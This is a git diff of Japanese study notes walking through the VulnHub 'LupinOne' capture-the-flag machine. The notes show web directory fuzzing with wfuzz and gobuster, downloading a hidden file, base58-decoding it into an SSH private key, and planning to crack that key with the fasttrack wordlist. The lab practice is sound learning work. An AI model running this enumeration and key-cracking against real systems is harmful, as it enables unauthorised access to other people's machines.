@@ -1,16 +1,5 @@
 ## LupinOne
 
-## Question
-- owasp-zapを使う(まだしなくていい)
-- ステガノグラフィを調べる
-- raft-large-directoriesとrockyouテキストの単語数を調べる
-- localとfindコマンドの違いは
-- 秘密鍵と公開鍵の中身のフォーマットの違いは
-- `$()`これは何？何と呼ぶ？
-- ttyコマンドとは
-- `sh < $(tty) > $(tty) 2> $(tty)`これは何
-- base58とbase64の違いは
-
 ### ポートスキャンまで同じ
 - 22,80
 
@@ -20,6 +9,7 @@
 ### robots.txtを見る
 - `curl http://$IP/robots.txt` 
 - ヒントは`/~myfiles`で、ディレクトリの初めに~がついていることがわかる
+- ~myfilesを見ても`404 error`になる  
 
 ### 隠しディレクトリを探す
 - `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  --hc 404 "http://$IP/~FUZZ/"`
@@ -31,7 +21,16 @@
   - `secret` 異なる辞書を使っている 
 
 ### サイトを見る
-- 見つけたリンクでサイトを確認する。使われているであろう、ユーザ名がわかる
+- 見つけたリンクでサイトを翻訳して確認する。分かったことがある
+  - このディレクトリに秘密鍵があること
+  - 秘密鍵はfasttrackで解析する
+  - ユーザ名はicex64であること
+ 
+### fasttrackとは
+- 移動してみる/usr/share/wordlists/fasttrackにある辞書
+- `less fasttrack.txt`中身を見るとパスワードファイルらしい
+- `wc fasttrack.txt`数が少ない
+
 
 ### さらに隠しファイルを探すが、その前に辞書を整理する
 - wfuzzの特性上`#`も200(成功)に反応するので、`#`を辞書から削除する
@@ -50,6 +49,9 @@
 - `gobuster fuzz -u http://$IP/~secret/.FUZZ -w /usr/share/wordlists/rockyou.txt -b 404`
 ### textのダウンロード
 - `curl http://$IP/~secret/.mysecret.txt > .mysecret2.txt`
+- または
+- `curl -OL http://$IP/~secret/.mysecret.txt`
+  - `-L`リダイレクト,`-O`標準出力せずにダウンロードする 
 - コピーする
 - CyberChefでペーストして、searchにbase58と入力する。Base58でデコード(復号)する。そして、コピーする
 - `cat > key`で貼り付ける。注意するのは、ペーストしたら改行してから、`ctrl + c`で抜ける
